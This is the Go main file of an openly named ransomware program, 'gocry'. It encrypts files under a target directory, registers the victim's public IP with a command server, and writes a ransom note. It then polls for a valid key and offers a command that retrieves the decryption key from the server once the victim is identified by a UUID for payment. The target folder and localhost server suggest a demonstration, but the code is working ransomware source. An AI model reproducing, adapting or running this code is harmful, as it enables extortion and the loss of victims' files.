package main

import (
	"bufio"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"time"

	"github.com/awnumar/memguard"
	"github.com/nireo/gocry/crypt"
	"github.com/nireo/gocry/ransomware"
	"golang.org/x/exp/errors/fmt"
)

var rootToEncrypt string = "./test"

const message string = `
Hello, you've been infected by gocry. Your files have been encrypted using military grade encryption >:D.
Do not use any decryption software or change the files, otherwise they might be lost forever.

How to decrypt:
1. Type 'decrypt' into the command-line such that 
2. Done.
`

func main() {
	// safely terminate in case of an interrupt signal
	memguard.CatchInterrupt()
	defer memguard.Purge()

	// validate the root path just incase
	if strings.HasSuffix(rootToEncrypt, "/") {
		rootToEncrypt = rootToEncrypt[:len(rootToEncrypt)-1]
	}

	rw, err := ransomware.NewRansomware(rootToEncrypt)
	if err != nil {
		log.Fatalf("error creating a ransomware instance: %s", err)
	}

	rw.MemguardKey = memguard.NewEnclave(rw.Key)

	crypt.EncryptRoot(rw.RootDir, rw.MemguardKey)
	if err := rw.WriteMemSafeKey(); err != nil {
		log.Fatal(err)
	}

	rw.Data.GetPublicIP()
	rw.Data.SendToServer("http://localhost:8080/register")
	if err := rw.CreateRansomInfoFile(message); err != nil {
		log.Fatal(err)
	}

	// Start an infnite loop which checks key validity. We start in a goroutine, since
	// we want the user to be able to interact with the ransomware.
	go func() {
		for {
			fmt.Println()
			fmt.Println("Checking key file...")

			if ok := rw.CheckIfValidMemSafeKey(); ok {
				crypt.DecryptRoot(rw.RootDir, rw.MemguardKey)
				fmt.Println("Thank you for your cooperation!")

				// remove the generated files
				rw.RemoveRansomFile()
				rw.RemoveKeyFile()

				// Stop the whole program
				os.Exit(0)
			}

			fmt.Println("Key did not match, checking again in 1 minute(s)...")
			time.Sleep(time.Second * 20)
		}
	}()

	fmt.Println("You can find commands to interact with gocry by typing: commands")

	reader := bufio.NewReader(os.Stdin)
	for {
		text, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("error reading your command, please try again!")
			continue
		}
		text = strings.Replace(text, "\n", "", -1)
		if text == "commands" {
			fmt.Println("'commands' - displays all of the commands available.")
			fmt.Println("'uuid' - display your unique indentifer used to pay your ransomware.")
			fmt.Println("'decrypt' - decrypts all the encrypted files only if the key.txt containst the right key.")
		} else if text == "uuid" {
			fmt.Println(rw.Data.UUID)
		} else if text == "decrypt" {
			// send the key to the database and get the decrypted key using the private rsa key from the server.
			key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
			if err != nil {
				log.Fatalf("error reading key file: %s", err)
			}

			decryptedKey, err := rw.Data.GetKeyFromServer(key)
			if err != nil {
				fmt.Println("error decrypting key from server...")
				continue
			}

			if err := rw.RemoveKeyFile(); err != nil {
				fmt.Println("error removing old key file...")
				continue
			}

			if err := ioutil.WriteFile(rw.RootDir+"/key.txt", decryptedKey, 0600); err != nil {
				log.Fatalf("write output: %s", err)
			}
		}
	}
}
